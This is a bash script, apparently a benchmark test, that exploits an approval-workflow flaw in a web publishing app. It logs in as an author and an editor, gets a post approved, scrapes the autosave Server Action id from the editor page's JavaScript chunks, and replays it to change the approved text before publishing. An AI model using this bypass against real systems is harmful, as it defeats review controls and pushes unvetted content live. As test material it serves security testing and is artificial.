#!/usr/bin/env bash
# APPROVAL-BYPASS-001 (CWE-841): maker-checker bypass through a Server Action.
# user1 writes a draft and submits it, the editor approves it, then user1 calls
# the editor page's autosave action - which rewrites the body without dropping
# the approval - and publishes. What goes live is text nobody reviewed.
#
# The action has no URL of its own: its id is harvested from the editor page's
# client chunk, exactly as a browser gets it, and replayed as a plain POST.
set -u; . "$(dirname "$0")/_lib.sh"
new_jar ED
login user1@bench.local User123!
login_as "$ED" editor@bench.local Editor123!

R=$(curl -s -b "$JAR" -X POST "$TARGET/api/posts" -H 'content-type: application/json' \
  -d '{"title":"Q3 pricing announcement","body":"Prices stay the same this quarter."}')
ID=$(echo "$R" | json_get id); SLUG=$(echo "$R" | json_get slug)
[ -n "$ID" ] || { echo "could not create a draft" >&2; exit 2; }
cleanup() { curl -s -b "$JAR" -X DELETE "$TARGET/api/posts/$ID" >/dev/null; }

post_status "$JAR" "/api/posts/$ID/submit" >/dev/null                      # 1. author submits
post_status "$ED" "/api/posts/$ID/approve" >/dev/null                      # 2. editor approves
[ "$(post_field "$SLUG" status)" = approved ] || { cleanup; echo "review flow did not reach approved" >&2; exit 2; }

# 3. the autosave action id, from the edit page's own client chunks
AID=""
for c in $(chunk_urls "/posts/$ID/edit"); do
  AID=$(curl -s "$TARGET$c" \
    | grep -o '"[0-9a-f]\{40,44\}",[A-Za-z_$.]*callServer,void 0,[A-Za-z_$.]*findSourceMapURL,"autosaveDraft"' \
    | head -1 | cut -d'"' -f2)
  [ -n "$AID" ] && break
done
[ -n "$AID" ] || { cleanup; echo "autosave action id not found in the editor chunks" >&2; exit 2; }

MARK="UNREVIEWED-CONTENT-MARKER-$$"
curl -s -b "$JAR" -X POST "$TARGET/posts/$ID/edit" \
  -H "Next-Action: $AID" -H "Origin: $TARGET" -H 'Accept: text/x-component' \
  -H 'Content-Type: text/plain;charset=UTF-8' \
  --data "[\"$ID\",\"$MARK\"]" >/dev/null                                   # 4. autosave new text
post_status "$JAR" "/api/posts/$ID/publish" >/dev/null                     # 5. publish

STATUS=$(post_field "$SLUG" status); BODY=$(post_field "$SLUG" body)
cleanup
[ "$STATUS" = published ] && [ "$BODY" = "$MARK" ]
